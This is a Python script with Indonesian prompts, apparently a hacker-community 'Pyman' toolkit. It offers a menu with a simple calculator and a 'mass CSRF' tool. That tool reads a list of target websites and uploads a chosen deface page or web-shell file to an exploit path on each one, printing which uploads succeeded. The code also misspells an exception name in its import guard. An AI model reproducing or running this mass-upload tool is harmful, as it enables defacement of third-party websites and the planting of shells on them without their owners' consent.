pilihan = 1
pilihan = 2

mtk = 1
mtk = 2
mtk = 3
mtk = 4
mtk = 5
mtk = 6


import os
  
try:
  import requests
except ImporError:
    os.system("pip install requests")
    
    
    
    


print(50*"_")
print("Selamat Datang Di Tools Pyman")
print("Author : Hilman.4TX")
print("Komunitas : BL4CK.4TX")
print("YT : HilmanXcode")
print("Jika Ingin Keluar Tekan Ctrl+C Lalu Enter ")
print("Enjoy")
print(50*"_")

print(50*"_")
print(" Daftar Tools Di Bawah Ini : ")
print(" 1.CSRF MASSAL")
print(" 2.Penghitungan Matematika")
print(" Keluar : CTRL+C Lalu Enter ")
print(50*"_")

pilihan = input("Masukkan Pilihan Anda : ")
pilihan = int(pilihan)


if pilihan == 1:
  os.system("clear")
  
  print(50*"_")
  print("Selamat Datang Di Tools Pyman.4TX")
  print("Author : Hilman.4TX")
  print("Komunitas : BL4CK.4TX")
  print("YT : HilmanXcode")
  print("Tipe Tools : CSRF Massal")
  print(50*"_")
  target = str(input("Masukkan List Target : "))
  target_list = open(target,'r').readlines()
  exploit = str(input("Masukkan Exploit nya : "))
  tipe = str(input("Masukkan Tipe Post : "))
  pepes = str(input("Masukkan File Deface/Shell : "))
  
  
  
  for URL in target_list:
    URL=URL.strip()
    deface=open(pepes,"r")
    files={
      tipe:deface
    }
    try:
      x=requests.post(URL+"/"+exploit, files=files)
      if x.status_code == 200:
        print(URL+" > Status Code 200")
      else:
        print(URL+" > Gagal Bro!")
  
  
    except:
      print(URL+" > Gagal Bro!")
    
    
    

    









elif pilihan == 2:
  os.system("clear")
  
  for _ in range(100):
    print(50*"_")
    print("1.Penjumlahan")
    print("2.Pembagian")
    print("3.Perkalian")
    print("4.Pengurangan")
    print("5.Modulus")
    print("6.Keluar")
    print(50*"_")
     
    mtk = input("Masukkan Pilihan Anda : ")
    mtk = int(mtk)
     
    
    if mtk == 1:
      os.system("clear")
      tam1 = input("Masukkan Angka Pertama : ")
      tam1 = int(tam1)
      tam2 = input("Masukkan Angka Kedua : ")
      tam2 = int(tam2)
      tasl = tam1 + tam2
      print(tasl)
      
      
     
    elif mtk == 2:
      os.system("clear")
      kal1 = input("Masukkan Angka Pertama : ")
      kal1 = int(kal1)
      kal2 = input("Masukkan Angka Kedua : ")
      kal2 = int(kal2)
      khsl = kal1 // kal2
      print(khsl)
      
    elif mtk == 3:
      os.system("clear")
      gi1 = input("Masukkan Angka Pertama : ")
      gi1 = int(gi1)
      gi2 = input("Masukkan Angka Kedua : ")
      gi2 = int(gi2)
      ghsl = gi1 * gi2
      print(ghsl)
      
      
    elif mtk == 4:
      os.system("clear")
      rang1 = int(input("Masukkan Angka Pertama : "))
      rang2 = int(input("Masukkan Angka Kedua : "))
      rasl = rang1 - rang2
      print(rasl)
      
      
    elif mtk == 5:
      os.system("clear")
      dul1 = int(input("Masukkan Angka Pertama : "))
      dul2 = int(input("Masukkan Angka Kedua : "))
      duhsl = dul1 % dul2
      print(duhsl)
      
    elif mtk == 6:
      os.system("clear")
      os.system("python Pyman.py")
    







